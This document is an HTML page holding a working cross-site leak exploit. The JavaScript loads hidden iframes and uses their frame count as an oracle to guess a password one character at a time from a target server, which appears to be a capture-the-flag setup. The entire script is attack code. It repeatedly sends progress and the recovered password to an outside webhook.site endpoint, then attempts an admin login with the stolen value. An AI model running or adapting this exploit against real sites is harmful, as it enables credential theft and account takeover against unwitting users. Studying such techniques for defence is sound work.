<!DOCTYPE html>
<html>
<head><title>Fixed Iframe Counting</title></head>
<body>
<h1>FIXED iframe frame counting attack...</h1>
<pre id="output"></pre>
<div id="container" style="position:absolute;left:-9999px;"></div>
<script>
const output = document.getElementById('output');
const container = document.getElementById('container');
const TARGET = 'https://127.0.0.1:9999/';
const CHARSET = '0123456789abcdef';
let knownPassword = 'lebah';

function log(msg) {
    output.textContent += msg + '\n';
    console.log(msg);
}

// DETERMINISTIC iframe frame counting (not timing-based!)
async function testFrameCount(pass) {
    return new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = TARGET + '?pass=' + encodeURIComponent(pass);
        
        let resolved = false;
        
        const cleanup = () => {
            if (iframe.parentNode) container.removeChild(iframe);
        };
        
        // Faster timeout for speed after oracle verification
        const timeout = setTimeout(() => {
            if (!resolved) {
                cleanup();
                resolved = true;
                resolve({ pass, result: 'timeout', frameCount: null });
            }
        }, 1000); // Reduced to 1 second
        
        iframe.onload = () => {
            // Minimal wait after onload
            setTimeout(() => {
                if (!resolved) {
                    try {
                        const frameCount = iframe.contentWindow.length;
                        clearTimeout(timeout);
                        cleanup();
                        resolved = true;
                        resolve({ pass, result: 'success', frameCount });
                    } catch(e) {
                        clearTimeout(timeout);
                        cleanup();
                        resolved = true;
                        resolve({ pass, result: 'error', frameCount: null, error: e.message });
                    }
                }
            }, 200); // Reduced to 200ms after onload
        };
        
        iframe.onerror = () => {
            if (!resolved) {
                clearTimeout(timeout);
                cleanup();
                resolved = true;
                resolve({ pass, result: 'onerror', frameCount: null });
            }
        };
        
        container.appendChild(iframe);
    });
}

async function leakPassword() {
    log('[*] DETERMINISTIC iframe frame counting attack');
    log('[*] Oracle: frameCount=1 means substring match, frameCount=0 means no match');
    log('[*] Known prefix: ' + knownPassword + '\n');
    
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?status=iframe_fixed_started').catch(e=>{});
    
    // First, verify the oracle works with known good/bad
    log('[*] Verifying oracle...');
    const testGood = await testFrameCount('lebah');
    log(`  "lebah" (should be 1): frameCount=${testGood.frameCount}, result=${testGood.result}`);
    
    const testBad = await testFrameCount('lebahZ');
    log(`  "lebahZ" (should be 0): frameCount=${testBad.frameCount}, result=${testBad.result}`);
    
    if (testGood.frameCount !== 1 || testBad.frameCount !== 0) {
        log('\n❌ Oracle verification failed! Frame counting not working reliably.');
        fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?error=oracle_failed').catch(e=>{});
        return;
    }
    
    log('\n✅ Oracle verified! Proceeding with leak...\n');
    
    // Leak characters in PARALLEL batches for speed
    for (let pos = 0; pos < 8; pos++) { // 8 chars to fit in time
        log(`[*] Position ${pos+1}/8...`);
        let found = false;
        
        // Test in batches of 4 for speed
        for (let i = 0; i < CHARSET.length; i += 4) {
            const batch = [];
            for (let j = 0; j < 4 && (i+j) < CHARSET.length; j++) {
                batch.push(knownPassword + CHARSET[i+j]);
            }
            
            log(`  Testing batch: ${batch.map(c => c[c.length-1]).join(', ')}`);
            
            // Test all 4 in parallel
            const promises = batch.map(cand => testFrameCount(cand));
            const results = await Promise.all(promises);
            
            // Check results
            for (let k = 0; k < results.length; k++) {
                const result = results[k];
                const char = batch[k][batch[k].length-1];
                log(`    "${char}": frameCount=${result.frameCount}`);
                
                if (result.frameCount === 1) {
                    knownPassword = batch[k];
                    log(`  ✅ MATCH! Found '${char}' -> ${knownPassword}\n`);
                    
                    // Send progress
                    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
                    
                    found = true;
                    break;
                }
            }
            
            if (found) break;
        }
        
        if (!found) {
            log(`  ❌ No match found at position ${pos+1}!`);
            break;
        }
    }
    
    log('\n========================================');
    log('LEAKED PASSWORD (partial): ' + knownPassword);
    log('========================================');
    
    // Final exfiltration
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?password=' + encodeURIComponent(knownPassword)).catch(e=>{});
    
    // Test login
    log('\n[*] Testing login...');
    setTimeout(async () => {
        try {
            const response = await fetch(TARGET + 'login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `username=admin&password=${encodeURIComponent(knownPassword)}`,
                credentials: 'include'
            });
            
            const success = response.redirected || !response.url.includes('login');
            log(`Login result: ${success ? '✅ SUCCESS!' : '❌ Failed'}`);
            
            if (success) {
                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?LOGIN_SUCCESS=' + encodeURIComponent(knownPassword)).catch(e=>{});
            }
        } catch (e) {
            log('Login test error: ' + e.message);
        }
    }, 1000);
}

setTimeout(leakPassword, 500);
</script>
</body>
</html>
